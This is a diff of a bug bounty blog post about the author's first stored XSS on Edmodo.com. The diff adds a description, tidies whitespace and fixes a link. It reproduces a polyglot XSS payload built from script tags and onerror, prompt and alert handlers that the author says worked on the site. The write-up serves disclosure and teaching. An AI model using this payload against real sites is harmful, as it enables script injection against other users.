@@ -2,6 +2,7 @@
 layout: default
 title: "My First Stored XSS on Edmodo.com - Hunting Methodology"
 date: 2019-03-13
+description: "How I found my first stored XSS vulnerability on Edmodo.com using manual testing and subdomain enumeration. A beginner's journey to bug bounty."
 categories: [bugbounty, xss, writeup]
 tags: [edmodo, xss, bug-bounty, writeup]
 ---
@@ -63,14 +64,14 @@ People might be wondering about the payload I used. It's not mine - I used an **
 Here's the payload I used:
 
 ```javascript
-">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg"> 
+">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
 ```
 
 > 💡 **Note:** I used this payload initially, then removed unnecessary parts while making the PoC video.
 
 ## Twitter Status
 
-[![Twitter Status](https://raw.githubusercontent.com/ZishanAdThandar/blog/refs/heads/main/_posts/bugbounty/img/1b.png)]()https://x.com/ZishanAdThandar/status/1045959846535856128")
+[![Twitter Status](https://raw.githubusercontent.com/ZishanAdThandar/blog/refs/heads/main/_posts/bugbounty/img/1b.png)](https://x.com/ZishanAdThandar/status/1045959846535856128")
 
 🔗 **Direct Link:** [View on X/Twitter](https://x.com/ZishanAdThandar/status/1045959846535856128)
 
